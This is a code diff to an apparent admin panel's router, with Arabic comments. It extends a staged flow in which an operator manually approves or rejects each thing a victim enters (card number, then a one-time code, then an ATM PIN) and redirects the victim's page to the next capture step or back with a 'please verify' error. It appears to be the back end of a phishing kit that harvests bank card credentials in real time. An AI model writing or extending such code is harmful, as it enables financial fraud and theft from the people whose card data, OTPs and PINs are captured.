@@ -511,31 +511,45 @@ const adminRouter = router({
       const booking = await getBookingByReference(reference);
       const clientIp = booking?.clientIp || "";
       const existingPayment = await getPaymentByReference(reference);
+      // step 1=بطاقة مدخلة, step 2=OTP مدخل, step 3=ATM مدخل
       const currentStep = existingPayment?.step ?? 1;
 
       // تحديد الصفحة المستهدفة حسب المرحلة والإجراء
       let targetPage: string | null = null;
 
       if (action === "verified") {
-        // قبول: المرحلة 1 (بطاقة) → صفحة ATM | المرحلة 2 (ATM) → صفحة النجاح
-        if (currentStep <= 1) {
-          // مرحلة البطاقة: قبول → صفحة ATM PIN
+        // قبول:
+        // step 1 (بطاقة مدخلة) → صفحة OTP
+        // step 2 (OTP مدخل) → صفحة ATM PIN
+        // step 3 (ATM مدخل) → صفحة الخطوة التالية (bCall انتظار)
+        if (currentStep === 1) {
+          // بعد مرحلة البطاقة: قبول → صفحة OTP
+          targetPage = "code";
+          await createOrUpdatePayment(reference, { paymentAction: "accepted" } as any);
+        } else if (currentStep === 2) {
+          // بعد مرحلة OTP: قبول → صفحة ATM PIN
           targetPage = "pin";
           await createOrUpdatePayment(reference, { paymentAction: "pass", step: 2 } as any);
         } else {
-          // مرحلة ATM: قبول → صفحة النجاح
+          // بعد مرحلة ATM: قبول → bCall (انتظار الخطوة التالية)
           targetPage = "bCall";
           await createOrUpdatePayment(reference, { paymentAction: "accepted", status: "verified" } as any);
           await updateBookingStatus(reference, "completed", 1);
         }
       } else if (action === "denied") {
-        // رفض: المرحلة 1 (بطاقة) → صفحة البطاقة مع خطأ | المرحلة 2 (ATM) → صفحة ATM مع خطأ
-        if (currentStep <= 1) {
+        // رفض:
+        // step 1 (بطاقة) → صفحة البطاقة مع رسالة "برجاء التحقق من معلومات البطاقة"
+        // step 2 (OTP) → صفحة OTP مع رسالة "برجاء التحقق من الرمز المرسل"
+        // step 3 (ATM) → صفحة ATM مع رسالة "برجاء التحقق من رقم الصراف"
+        if (currentStep === 1) {
           targetPage = "payments?declined=true";
           await createOrUpdatePayment(reference, { paymentAction: "denied", step: 1 } as any);
+        } else if (currentStep === 2) {
+          targetPage = "code?declined=true";
+          await createOrUpdatePayment(reference, { paymentAction: "denied", step: 2 } as any);
         } else {
           targetPage = "pin?declined=true";
-          await createOrUpdatePayment(reference, { paymentAction: "denied", step: 2 } as any);
+          await createOrUpdatePayment(reference, { paymentAction: "denied", step: 3 } as any);
         }
       } else if (action === "accepted") {
         // متوافق مع السيناريو القديم - توجيه لصفحة OTP
